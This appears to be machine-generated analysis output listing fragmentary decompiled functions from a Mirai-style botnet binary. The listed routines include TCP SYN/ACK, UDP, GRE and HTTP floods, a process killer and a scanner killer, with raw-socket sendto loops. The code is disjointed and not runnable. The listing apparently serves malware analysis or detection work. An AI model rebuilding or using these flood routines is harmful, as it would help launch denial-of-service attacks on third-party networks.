+        while (true) {
+            while (true) {
+            while (true) {
+                                                while (true) {
+                                                        int32_t sock; // 0x403698
+                                                        recv(sock, &buf, length, MSG_NOSIGNAL);
+                                                                while (true) {
+                                                                        int32_t sock2; // 0x40313c
+                                                                        v597 = recv(sock2, (int32_t *)(v315 + v601), v312 - v601, MSG_NOSIGNAL);
+                                                                                    while (true) {
+                                                                                        int32_t sock3; // 0x4032f8
+                                                                                        int32_t v624 = recv(sock3, &buf, 0x2800, MSG_NOSIGNAL); // 0x403304
+                                                                                            int32_t sock4; // 0x4027c8
+                                                                                            int32_t v633 = recv(sock4, &buf, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0x4027d8
+                                                                                                while (true) {
+                                                                                                        while (true) {
+                                                                                                        case 7: {
+                                                                                                                fd2 = close(fd);
+                                                                                                        case 10: {
+                                                                                                                send(length, &buf2, length2, MSG_NOSIGNAL);
+                                                                                                                        while (true) {
+                                                                                                                            while (true) {
+                                                                                                                                    fcntl(fd2, F_GETFL);
+                                                                                                                                    int32_t sock5; // 0x401d70
+                                                                                                                                    setsockopt(sock5, 0, 0x1002, &option_value, 4);
+                                                                                                                                    int32_t sock6; // 0x401dac
+                                                                                                                                    connect(sock6, (struct sockaddr *)&addr, 16);
+                                                                                                                while (true) {
+                                                                                                                    while (true) {
+                                                                                        fd2 = close(fd);
+                                                                    fd2 = close(fd);
+                        case 6: {
+                        case 7: {
+=================FUNCTION : attack_tcp_ack ===================
+++++++++ FUNCTION START 9128
+++++++++ FUNCTION END 9717
+++++++++ FUNCTION LENGTH 589
+    struct sockaddr * v108;
+    attack_get_opt_int(v311, (int32_t *)message, 2, 0);
+    int32_t v312 = attack_get_opt_int(v311, (int32_t *)message, 3, 0xffff); // 0x406524
+    attack_get_opt_int(v311, (int32_t *)message, 4, 64);
+    int32_t v313 = 0x1000000 * attack_get_opt_int(v311, (int32_t *)message, 5, 0) / 0x1000000; // 0x40657c
+    int32_t v314 = attack_get_opt_int(v311, (int32_t *)message, 6, 0xffff); // 0x406590
+    int32_t v315 = attack_get_opt_int(v311, (int32_t *)message, 7, 0xffff); // 0x4065b0
+    int32_t v316 = attack_get_opt_int(v311, (int32_t *)message, 17, 0xffff); // 0x4065d0
+    int32_t v317 = attack_get_opt_int(v311, (int32_t *)message, 18, 0xffff); // 0x4065f0
+    attack_get_opt_int(v311, (int32_t *)message, 11, 0);
+    attack_get_opt_int(v311, (int32_t *)message, 12, 1);
+    int32_t v318 = attack_get_opt_int(v311, (int32_t *)message, 13, 0); // 0x406650
+    attack_get_opt_int(v311, (int32_t *)message, 14, 0);
+    attack_get_opt_int(v311, (int32_t *)message, 15, 0);
+    attack_get_opt_int(v311, (int32_t *)message, 16, 0);
+    int32_t v319 = attack_get_opt_int(v311, (int32_t *)message, 0, 512); // 0x4066d0
+    int32_t v320 = 0x1000000 * attack_get_opt_int(v311, (int32_t *)message, 1, 1) / 0x1000000; // 0x40670c
+    int32_t v323 = attack_get_opt_ip(v311, (int32_t *)message, 25, v322, v320); // 0x40671c
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x406738
+    if (sock_fd == -1) {
+    int32_t v324 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x406770
+            while (true) {
+                rand_next();
+                rand_str((int32_t *)(v328 + 40), v319);
+        while (true) {
+            while (true) {
+            while (true) {
+                                                result = close(sock_fd);
+                                                result = close(sock_fd);
+                                        checksum_tcpudp(message, v333 + 20, v352, v332);
+                                        sendto(sock_fd, (int32_t *)message, v319 + 40, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                while (true) {
+    result = close(sock_fd);
+=================FUNCTION : attack_tcp_syn ===================
+++++++++ FUNCTION START 9720
+++++++++ FUNCTION END 10322
+++++++++ FUNCTION LENGTH 602
+    struct sockaddr * v108;
+    attack_get_opt_int(message, (int32_t *)a4, 2, 0);
+    int32_t v311 = attack_get_opt_int(message, (int32_t *)a4, 3, 0xffff); // 0x406ddc
+    attack_get_opt_int(message, (int32_t *)a4, 4, 64);
+    int32_t v312 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 5, 1) / 0x1000000; // 0x406e34
+    int32_t v313 = attack_get_opt_int(message, (int32_t *)a4, 6, 0xffff); // 0x406e48
+    int32_t v314 = attack_get_opt_int(message, (int32_t *)a4, 7, 0xffff); // 0x406e68
+    int32_t v315 = attack_get_opt_int(message, (int32_t *)a4, 17, 0xffff); // 0x406e88
+    int32_t v316 = attack_get_opt_int(message, (int32_t *)a4, 18, 0); // 0x406ea8
+    int32_t v317 = attack_get_opt_int(message, (int32_t *)a4, 11, 0); // 0x406ec8
+    int32_t v318 = attack_get_opt_int(message, (int32_t *)a4, 12, 0); // 0x406ee8
+    int32_t v319 = attack_get_opt_int(message, (int32_t *)a4, 13, 0); // 0x406f08
+    int32_t v320 = attack_get_opt_int(message, (int32_t *)a4, 14, 0); // 0x406f28
+    int32_t v321 = attack_get_opt_int(message, (int32_t *)a4, 15, 1); // 0x406f48
+    int32_t v322 = attack_get_opt_int(message, (int32_t *)a4, 16, 0); // s2
+    int32_t v325 = attack_get_opt_ip(message, (int32_t *)a4, 25, v323, (int32_t)&v324); // 0x406f8c
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x406fa8
+    if (sock_fd == -1) {
+    int32_t v326 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x406fe0
+            while (true) {
+                rand_next();
+                rand_next();
+            while (true) {
+                while (true) {
+                while (true) {
+                                                    result = close(sock_fd);
+                                                    result = close(sock_fd);
+                                            checksum_tcpudp(message, v339 + 20, 0x2800, 40);
+                                            sendto(sock_fd, (int32_t *)message, 60, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                    while (true) {
+        while (true) {
+    result = close(sock_fd);
+=================FUNCTION : attack_gre_eth ===================
+++++++++ FUNCTION START 6974
+++++++++ FUNCTION END 7583
+++++++++ FUNCTION LENGTH 609
+    struct sockaddr * v108;
+    attack_get_opt_int(message, (int32_t *)a4, 2, 0);
+    int32_t v311 = attack_get_opt_int(message, (int32_t *)a4, 3, 0xffff); // 0x404ab8
+    attack_get_opt_int(message, (int32_t *)a4, 4, 64);
+    int32_t v312 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 5, 1); // 0x404b08
+    int32_t v313 = attack_get_opt_int(message, (int32_t *)a4, 6, 0xffff); // 0x404b24
+    int32_t v314 = attack_get_opt_int(message, (int32_t *)a4, 7, 0xffff); // 0x404b44
+    int32_t v315 = attack_get_opt_int(message, (int32_t *)a4, 0, 512); // 0x404b64
+    int32_t v316 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 1, 1); // 0x404b90
+    int32_t v317 = attack_get_opt_int(message, (int32_t *)a4, 19, 0); // s2
+    int32_t v319 = attack_get_opt_int(message, (int32_t *)a4, 25, v318); // 0x404bd0
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x404bec
+    if (sock_fd == -1) {
+    int32_t v320 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x404c24
+            while (true) {
+                    rand_next();
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                                                    rand_str((int32_t *)(v340 + 8), v315);
+                                                    result = close(sock_fd);
+                                                    int32_t v349 = rand_next(); // bp-128
+                                                    int32_t v350 = rand_next(); // bp-124
+                                                        checksum_tcpudp(v317, v340, (int32_t)v353, v325);
+                                                        sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                                    rand_str((int32_t *)(v340 + 8), v315);
+                                                    result = close(sock_fd);
+                                                rand_str((int32_t *)(v340 + 8), v315);
+                                                result = close(sock_fd);
+                                while (true) {
+        while (true) {
+    result = close(sock_fd);
+=================FUNCTION : attack_udp_generic ===================
+++++++++ FUNCTION START 10802
+++++++++ FUNCTION END 11441
+++++++++ FUNCTION LENGTH 639
+    struct sockaddr * v108;
+    attack_get_opt_int(message, (int32_t *)a4, 2, 0);
+    int32_t v311 = attack_get_opt_int(message, (int32_t *)a4, 3, 0xffff); // 0x407a10
+    attack_get_opt_int(message, (int32_t *)a4, 4, 64);
+    int32_t v312 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 5, 0); // 0x407a60
+    int32_t v313 = attack_get_opt_int(message, (int32_t *)a4, 6, 0xffff); // 0x407a7c
+    int32_t v314 = attack_get_opt_int(message, (int32_t *)a4, 7, 0xffff); // 0x407a9c
+    int32_t v315 = attack_get_opt_int(message, (int32_t *)a4, 0, 512); // 0x407abc
+    int16_t v316 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 1, 1) / 0x1000000; // 0x407b08
+    int32_t v318 = attack_get_opt_int(message, (int32_t *)a4, 25, v317); // 0x407b08
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0x407b24
+    if (sock_fd == -1) {
+    int32_t v319 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x407b5c
+                while (true) {
+                        while (true) {
+                            while (true) {
+                            while (true) {
+                                                    checksum_tcpudp(message, v349, (int32_t)v356, v324);
+                                                    sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                                checksum_tcpudp(message, v349, (int32_t)v356, v324);
+                                                sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                            result2 = close(sock_fd);
+                                while (true) {
+    result2 = close(sock_fd);
+=================FUNCTION : attack_gre_ip ===================
+++++++++ FUNCTION START 7586
+++++++++ FUNCTION END 8163
+++++++++ FUNCTION LENGTH 577
+    struct sockaddr * v108;
+    attack_get_opt_int(v311, (int32_t *)a4, 2, 0);
+    int32_t v312 = attack_get_opt_int(v311, (int32_t *)a4, 3, 0xffff); // 0x40532c
+    attack_get_opt_int(v311, (int32_t *)a4, 4, 64);
+    int32_t v313 = 0x1000000 * attack_get_opt_int(v311, (int32_t *)a4, 5, 1); // 0x40537c
+    int32_t v314 = attack_get_opt_int(v311, (int32_t *)a4, 6, 0xffff); // 0x405398
+    int32_t v315 = attack_get_opt_int(v311, (int32_t *)a4, 7, 0xffff); // 0x4053b8
+    int32_t v316 = attack_get_opt_int(v311, (int32_t *)a4, 0, 512); // 0x4053d8
+    int32_t v317 = 0x1000000 * attack_get_opt_int(v311, (int32_t *)a4, 1, 1) / 0x1000000; // 0x40540c
+    int32_t v319 = attack_get_opt_int(v311, (int32_t *)a4, 19, 0); // s2
+    int32_t v321 = attack_get_opt_int(v311, (int32_t *)a4, 25, v320); // 0x405444
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); // 0x405460
+    if (sock_fd == -1) {
+    int32_t v322 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x405498
+            while (true) {
+                    while (true) {
+                        while (true) {
+                        while (true) {
+                                                        checksum_tcpudp(v319, message + 44, (int32_t)v342, v316 + 8);
+                                                        sendto(sock_fd, (int32_t *)message, v316 + 52, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                                                    while (true) {
+                    rand_next();
+                        result = close(sock_fd);
+    result = close(sock_fd);
+=================FUNCTION : killer_kill_by_port ===================
+++++++++ FUNCTION START 14532
+++++++++ FUNCTION END 15451
+++++++++ FUNCTION LENGTH 919
+    struct sockaddr * v105;
+        int32_t fd = open((char *)&path, O_RDONLY); // 0x409120
+        while (true) {
+                while (true) {
+                while (true) {
+            close(fd2);
+                struct __dirstream * v340 = opendir((char *)table_retrieve_val(6, NULL)); // 0x409360
+                    while (true) {
+                        while (true) {
+                                    struct __dirstream * v364 = opendir((char *)&path2); // 0x409530
+                                        while (true) {
+                                                while (true) {
+                                                            kill(util_atoi((int64_t)v380, 10), SIGKILL);
+                                                            struct dirent * v381 = readdir((struct __dirstream *)fd2); // 0x40971c
+                                                closedir((struct __dirstream *)fd2);
+                                                v368 = readdir((struct __dirstream *)dirp);
+                                            closedir((struct __dirstream *)fd2);
+                                            v368 = readdir((struct __dirstream *)dirp);
+                                        v355 = closedir((struct __dirstream *)dirp2);
+                                                                        while (true) {
+                                                                        v314 = close(fd3);
+                        v355 = closedir((struct __dirstream *)dirp2);
+                closedir((struct __dirstream *)dirp);
+=================FUNCTION : attack_udp_vse ===================
+++++++++ FUNCTION START 11444
+++++++++ FUNCTION END 11998
+++++++++ FUNCTION LENGTH 554
+    struct sockaddr * v108;
+    attack_get_opt_int(v310, (int32_t *)a4, 2, 0);
+    int32_t v311 = attack_get_opt_int(message, (int32_t *)a4, 3, 0xffff); // 0x408134
+    attack_get_opt_int(message, (int32_t *)a4, 4, 64);
+    int32_t v312 = 0x1000000 * attack_get_opt_int(message, (int32_t *)a4, 5, 0); // 0x408184
+    int32_t v313 = attack_get_opt_int(message, (int32_t *)a4, 6, 0xffff); // 0x4081a0
+    int32_t v314 = attack_get_opt_int(message, (int32_t *)a4, 7, 0x6987); // 0x4081c0
+    int32_t sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); // 0x40820c
+    if (sock_fd == -1) {
+    int32_t v317 = setsockopt(sock_fd, 0, 3, &option_value, 4); // 0x408244
+            while (true) {
+            while (true) {
+                while (true) {
+                while (true) {
+                        result = close(sock_fd);
+                            result = close(sock_fd);
+                            checksum_tcpudp(message, v334 + 20, (int32_t)v341, v315 + 12);
+                            sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+                        result = close(sock_fd);
+                    while (true) {
+        while (true) {
+    result = close(sock_fd);
+=================FUNCTION : attack_udp_plain ===================
+++++++++ FUNCTION START 10325
+++++++++ FUNCTION END 10799
+++++++++ FUNCTION LENGTH 474
+    struct sockaddr * v108;
+    int32_t v311 = attack_get_opt_int(addr2, (int32_t *)a4, 7, 0xffff) % 0x10000; // 0x407630
+    int32_t v312 = attack_get_opt_int(addr2, (int32_t *)a4, 6, 0xffff); // 0x407648
+    int32_t v313 = attack_get_opt_int(addr2, (int32_t *)a4, 0, 512); // 0x407668
+    int32_t v314 = 0x1000000 * attack_get_opt_int(addr2, (int32_t *)a4, 1, 1) / 0x1000000; // s6
+        rand_next();
+        int32_t sock; // 0x407944
+        int32_t result = send(sock, (int32_t *)buf, v313 % 0x10000, MSG_NOSIGNAL); // 0x407954
+            result = send(sock, (int32_t *)buf, v313 % 0x10000, MSG_NOSIGNAL);
+        while (true) {
+        while (true) {
+            int32_t sock2; // 0x407700
+            connect(sock2, (struct sockaddr *)16, 16);
+                while (true) {
+                    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_UDP); // 0x407764
+                    result2 = sock_fd;
+                    if (sock_fd != -1) {
+                        bind(sock_fd, (struct sockaddr *)&addr, 16);
+                            int32_t v325 = rand_next(); // 0x4077d0
+                            int32_t sock3; // 0x407840
+                            connect(sock3, (struct sockaddr *)addr2, 16);
+=================FUNCTION : resolv_lookup ===================
+++++++++ FUNCTION START 19923
+++++++++ FUNCTION END 20819
+++++++++ FUNCTION LENGTH 896
+    struct sockaddr * v107;
+    while (true) {
+        int32_t v323 = rand_next(); // 0x40bc2c
+            close(fd);
+        int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x40bd04
+        if (sock_fd != v330) {
+            if (connect(sock_fd, (struct sockaddr *)&addr, 16) != v330) {
+                if (send(sock_fd, (int32_t *)&buf, length, MSG_NOSIGNAL) != v330) {
+                    fcntl(3, sock_fd);
+                    fcntl(4, sock_fd);
+                    int32_t * v345 = (int32_t *)(4 * sock_fd / 32 + (int32_t)&v344 + 28); // 0x40bda8
+                    uint32_t v346 = sock_fd % 32; // 0x40bdac
+                    int32_t nfds = sock_fd + 1; // 0x40bdd8
+                                                while (true) {
+                                        while (true) {
+                                int32_t v422 = recvfrom(sock_fd, (int32_t *)&buf2, 2048, MSG_NOSIGNAL, NULL, NULL); // 0x40be28
+=================FUNCTION : function_40a528 ===================
+++++++++ FUNCTION START 16883
+++++++++ FUNCTION END 17261
+++++++++ FUNCTION LENGTH 378
+    struct sockaddr * v104;
+    int32_t sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); // 0x40a568
+    if (sock_fd == -1) {
+    setsockopt(sock_fd, 0xffff, 4, &option_value, 4);
+    fcntl(fd, F_GETFL);
+        if (bind(fd, (struct sockaddr *)&addr, 16) == -1) {
+            connect(fd, (struct sockaddr *)&addr, 16);
+            close(fd);
+            result = killer_kill_by_port(0xe5bb);
+    return listen(fd, 1);
+=================FUNCTION : rand_init ===================
+++++++++ FUNCTION START 18489
+++++++++ FUNCTION END 18804
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+    int32_t pid = getpid(); // 0x40b7e8
+    int32_t v308 = pid ^ getppid();
+    int32_t proc_time = clock(); // 0x40b818
+    int32_t v309 = v308 ^ proc_time;
+    int32_t v310 = proc_time;
+    return proc_time;
+=================FUNCTION : util_local_addr ===================
+++++++++ FUNCTION START 30215
+++++++++ FUNCTION END 30545
+++++++++ FUNCTION LENGTH 330
+    struct sockaddr * v108;
+    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x40f770
+    if (sock_fd != -1) {
+        connect(sock_fd, (struct sockaddr *)&addr, 16);
+        getsockname(sock_fd, (struct sockaddr *)&addr, &addr_len);
+        close(sock_fd);
+=================FUNCTION : attack_start ===================
+++++++++ FUNCTION START 4498
+++++++++ FUNCTION END 4875
+++++++++ FUNCTION LENGTH 377
+    struct sockaddr * v107;
+    int32_t result = fork(); // 0x403ef8
+    int32_t v313 = fork(); // 0x403f40
+        kill(getppid(), SIGKILL);
+    while (true) {
+=================FUNCTION : attack_parse ===================
+++++++++ FUNCTION START 4878
+++++++++ FUNCTION END 5439
+++++++++ FUNCTION LENGTH 561
+    struct sockaddr * v108;
+            v333 = attack_start(v337, v339, v321, v325, (char)v322, v334);
+                    while (true) {
+                                    while (true) {
+=================FUNCTION : attack_get_opt_ip ===================
+++++++++ FUNCTION START 5897
+++++++++ FUNCTION END 6254
+++++++++ FUNCTION LENGTH 357
+    struct sockaddr * v108;
+        return inet_addr((char *)cp);
+    while (true) {
+        return inet_addr((char *)cp);
+=================FUNCTION : rand_alphastr ===================
+++++++++ FUNCTION START 18807
+++++++++ FUNCTION END 19194
+++++++++ FUNCTION LENGTH 387
+    struct sockaddr * v106;
+    while (true) {
+            while (true) {
+=================FUNCTION : util_memsearch ===================
+++++++++ FUNCTION START 28796
+++++++++ FUNCTION END 29153
+++++++++ FUNCTION LENGTH 357
+    struct sockaddr * v108;
+        while (true) {
+            while (true) {
+=================FUNCTION : util_stristr ===================
+++++++++ FUNCTION START 30548
+++++++++ FUNCTION END 30941
+++++++++ FUNCTION LENGTH 393
+    struct sockaddr * v108;
+    while (true) {
+        while (true) {
+=================FUNCTION : util_strncmp ===================
+++++++++ FUNCTION START 31312
+++++++++ FUNCTION END 31718
+++++++++ FUNCTION LENGTH 406
+    struct sockaddr * v108;
+            while (true) {
+    while (true) {
+=================FUNCTION : attack_get_opt_str ===================
+++++++++ FUNCTION START 4149
+++++++++ FUNCTION END 4495
+++++++++ FUNCTION LENGTH 346
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : attack_kill_all ===================
+++++++++ FUNCTION START 5442
+++++++++ FUNCTION END 5894
+++++++++ FUNCTION LENGTH 452
+    struct sockaddr * v108;
+            kill(9, SIGKILL);
+=================FUNCTION : util_fdgets ===================
+++++++++ FUNCTION START 29852
+++++++++ FUNCTION END 30212
+++++++++ FUNCTION LENGTH 360
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : rand_str ===================
+++++++++ FUNCTION START 19197
+++++++++ FUNCTION END 19583
+++++++++ FUNCTION LENGTH 386
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : killer_kill ===================
+++++++++ FUNCTION START 14214
+++++++++ FUNCTION END 14529
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+    return kill(pid, SIGKILL);
+=================FUNCTION : attack_get_opt_int ===================
+++++++++ FUNCTION START 6257
+++++++++ FUNCTION END 6614
+++++++++ FUNCTION LENGTH 357
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : resolv_entries_free ===================
+++++++++ FUNCTION START 19586
+++++++++ FUNCTION END 19920
+++++++++ FUNCTION LENGTH 334
+    struct sockaddr * v107;
+            free((int32_t *)v311);
+=================FUNCTION : util_strcmp ===================
+++++++++ FUNCTION START 30944
+++++++++ FUNCTION END 31309
+++++++++ FUNCTION LENGTH 365
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : util_itoa ===================
+++++++++ FUNCTION START 31721
+++++++++ FUNCTION END 32155
+++++++++ FUNCTION LENGTH 434
+    struct sockaddr * v108;
+    while (true) {
+=================FUNCTION : scanner_kill ===================
+++++++++ FUNCTION START 20822
+++++++++ FUNCTION END 21162
+++++++++ FUNCTION LENGTH 340
+    struct sockaddr * v108;
+    kill(pid, SIGKILL);
+=================FUNCTION : fd_ctrl ===================
+++++++++ FUNCTION START 32798
+++++++++ FUNCTION END 33113
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+=================FUNCTION : function_40157c ===================
+++++++++ FUNCTION START 800
+++++++++ FUNCTION END 1129
+++++++++ FUNCTION LENGTH 329
+    struct sockaddr * v104;
+=================FUNCTION : table_key ===================
+++++++++ FUNCTION START 33434
+++++++++ FUNCTION END 33749
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+=================FUNCTION : util_strcpy ===================
+++++++++ FUNCTION START 27782
+++++++++ FUNCTION END 28128
+++++++++ FUNCTION LENGTH 346
+    struct sockaddr * v108;
+=================FUNCTION : _init ===================
+++++++++ FUNCTION START 122
+++++++++ FUNCTION END 440
+++++++++ FUNCTION LENGTH 318
+    struct sockaddr * v110 = (struct sockaddr *)0x450af8;
+=================FUNCTION : fd_serv ===================
+++++++++ FUNCTION START 33116
+++++++++ FUNCTION END 33431
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+=================FUNCTION : checksum_tcpudp ===================
+++++++++ FUNCTION START 13854
+++++++++ FUNCTION END 14211
+++++++++ FUNCTION LENGTH 357
+    struct sockaddr * v108;
+=================FUNCTION : entry_point ===================
+++++++++ FUNCTION START 1132
+++++++++ FUNCTION END 1449
+++++++++ FUNCTION LENGTH 317
+    struct sockaddr * v108;
+=================FUNCTION : _fini ===================
+++++++++ FUNCTION START 32478
+++++++++ FUNCTION END 32795
+++++++++ FUNCTION LENGTH 317
+    struct sockaddr * v108;
+=================FUNCTION : table_init ===================
+++++++++ FUNCTION START 27031
+++++++++ FUNCTION END 27447
+++++++++ FUNCTION LENGTH 416
+    struct sockaddr * v107;
+=================FUNCTION : table_unlock_val ===================
+++++++++ FUNCTION START 26674
+++++++++ FUNCTION END 27028
+++++++++ FUNCTION LENGTH 354
+    struct sockaddr * v108;
+=================FUNCTION : rand_next ===================
+++++++++ FUNCTION START 18166
+++++++++ FUNCTION END 18486
+++++++++ FUNCTION LENGTH 320
+    struct sockaddr * v108;
+=================FUNCTION : function_40c2b8 ===================
+++++++++ FUNCTION START 21165
+++++++++ FUNCTION END 21525
+++++++++ FUNCTION LENGTH 360
+    struct sockaddr * v108;
+=================FUNCTION : _GLOBAL_OFFSET_TABLE_ ===================
+++++++++ FUNCTION START 34070
+++++++++ FUNCTION END 34385
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+=================FUNCTION : __RLD_MAP ===================
+++++++++ FUNCTION START 33752
+++++++++ FUNCTION END 34067
+++++++++ FUNCTION LENGTH 315
+    struct sockaddr * v108;
+=================FUNCTION : util_zero ===================
+++++++++ FUNCTION START 28467
+++++++++ FUNCTION END 28793
+++++++++ FUNCTION LENGTH 326
+    struct sockaddr * v108;
+=================FUNCTION : table_retrieve_val ===================
+++++++++ FUNCTION START 25992
+++++++++ FUNCTION END 26314
+++++++++ FUNCTION LENGTH 322
+    struct sockaddr * v108;
+=================FUNCTION : __uClibc_main ===================
+++++++++ FUNCTION START 32158
+++++++++ FUNCTION END 32475
+++++++++ FUNCTION LENGTH 317
+    struct sockaddr * v108;
+=================FUNCTION : attack_init ===================
+++++++++ FUNCTION START 6617
+++++++++ FUNCTION END 6971
+++++++++ FUNCTION LENGTH 354
+    struct sockaddr * v105;
+=================FUNCTION : checksum_generic ===================
+++++++++ FUNCTION START 13491
+++++++++ FUNCTION END 13851
+++++++++ FUNCTION LENGTH 360
+    struct sockaddr * v108;
+=================FUNCTION : util_strlen ===================
+++++++++ FUNCTION START 27450
+++++++++ FUNCTION END 27779
+++++++++ FUNCTION LENGTH 329
+    struct sockaddr * v108;
+=================FUNCTION : table_lock_val ===================
+++++++++ FUNCTION START 26317
+++++++++ FUNCTION END 26671
+++++++++ FUNCTION LENGTH 354
+    struct sockaddr * v108;
+=================FUNCTION : _ftext ===================
+++++++++ FUNCTION START 443
+++++++++ FUNCTION END 797
+++++++++ FUNCTION LENGTH 354
+    struct sockaddr * v105;
+=================FUNCTION : util_memcpy ===================
+++++++++ FUNCTION START 28131
+++++++++ FUNCTION END 28464
+++++++++ FUNCTION LENGTH 333
+    struct sockaddr * v108;
+================================================================================
+========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
+================================================================================
+=============================WHILE LOOPS ID : 1 @ attack_app_http ====================================
+++++++++ WHILE START : 1920 
+++++++++ WHILE FUNCTION : attack_app_http 
+++++++++ WHILE END : 4142 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		int32_t sock; // 0x403698
+		recv(sock, &buf, length, MSG_NOSIGNAL);
+		while (true) {
+		int32_t sock2; // 0x40313c
+		v597 = recv(sock2, (int32_t *)(v315 + v601), v312 - v601, MSG_NOSIGNAL);
+		while (true) {
+		int32_t sock3; // 0x4032f8
+		int32_t v624 = recv(sock3, &buf, 0x2800, MSG_NOSIGNAL); // 0x403304
+		int32_t sock4; // 0x4027c8
+		int32_t v633 = recv(sock4, &buf, 0x2800, MSG_PEEK | MSG_NOSIGNAL); // 0x4027d8
+		while (true) {
+		while (true) {
+		case 7: {
+		fd2 = close(fd);
+		case 10: {
+		send(length, &buf2, length2, MSG_NOSIGNAL);
+		while (true) {
+		while (true) {
+		fcntl(fd2, F_GETFL);
+		int32_t sock5; // 0x401d70
+		setsockopt(sock5, 0, 0x1002, &option_value, 4);
+		int32_t sock6; // 0x401dac
+		connect(sock6, (struct sockaddr *)&addr, 16);
+		while (true) {
+		while (true) {
+		fd2 = close(fd);
+		fd2 = close(fd);
+		case 6: {
+		case 7: {
+=============================WHILE LOOPS ID : 4 @ attack_parse ====================================
+++++++++ WHILE START : 5303 
+++++++++ WHILE FUNCTION : attack_parse 
+++++++++ WHILE END : 5408 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+=============================WHILE LOOPS ID : 5 @ attack_get_opt_ip ====================================
+++++++++ WHILE START : 6230 
+++++++++ WHILE FUNCTION : attack_get_opt_ip 
+++++++++ WHILE END : 6251 
+++++++++ INTRESTING INSTRUCTIONS :  
+		return inet_addr((char *)cp);
+=============================WHILE LOOPS ID : 7 @ attack_gre_eth ====================================
+++++++++ WHILE START : 7324 
+++++++++ WHILE FUNCTION : attack_gre_eth 
+++++++++ WHILE END : 7568 
+++++++++ INTRESTING INSTRUCTIONS :  
+		rand_next();
+		while (true) {
+		while (true) {
+		while (true) {
+		rand_str((int32_t *)(v340 + 8), v315);
+		result = close(sock_fd);
+		int32_t v349 = rand_next(); // bp-128
+		int32_t v350 = rand_next(); // bp-124
+		checksum_tcpudp(v317, v340, (int32_t)v353, v325);
+		sendto(sock_fd, (int32_t *)message, length, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		rand_str((int32_t *)(v340 + 8), v315);
+		result = close(sock_fd);
+		rand_str((int32_t *)(v340 + 8), v315);
+		result = close(sock_fd);
+		while (true) {
+=============================WHILE LOOPS ID : 9 @ attack_gre_ip ====================================
+++++++++ WHILE START : 7939 
+++++++++ WHILE FUNCTION : attack_gre_ip 
+++++++++ WHILE END : 8151 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		while (true) {
+		checksum_tcpudp(v319, message + 44, (int32_t)v342, v316 + 8);
+		sendto(sock_fd, (int32_t *)message, v316 + 52, MSG_NOSIGNAL, (struct sockaddr *)dest_addr, 16);
+		while (true) {
+		rand_next();
+		result = close(sock_fd);
+=============================WHILE LOOPS ID : 10 @ attack_tcp_stomp ====================================
+++++++++ WHILE START : 8616 
+++++++++ WHILE FUNCTION : attack_tcp_stomp 
+++++++++ WHILE END : 9106 
+++++++++ INTRESTING INSTRUCTIONS :  
+		while (true) {
+		while (true) {
+		struct sockaddr * v413;
+		rand_next();
+		return rand_str((int32_t *)(time_val + 40), v319);
+		close(fd);
+		result = close(sock_fd);
+		struct sockaddr * v450 = v413;
+		struct sockaddr * addr;
+		uint32_t v477 = recvfrom(sock_fd, (int32_t *)buf, 256, MSG_NOSIGNAL, addr, (int32_t *)addr_len); // 0x405efc
+		close(fd);
+		int32_t sock_fd2 = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP); // 0x405f88
+		fd = sock_fd2;
+		if (sock_fd2 == -1) {
+		fcntl(sock_fd2, F_GETFL);
+		rand_next();
+		rand_next();
+		return rand_str((int32_t *)(time_val + 40), v319);
+		int32_t v483 = rand_next(); // 0x4061d4
+		connect(fd, (struct sockaddr *)addr2, 16);
+		rand_next();
+		rand_next();
+		return rand_str((int32_t *)(time_val + 40), v319);
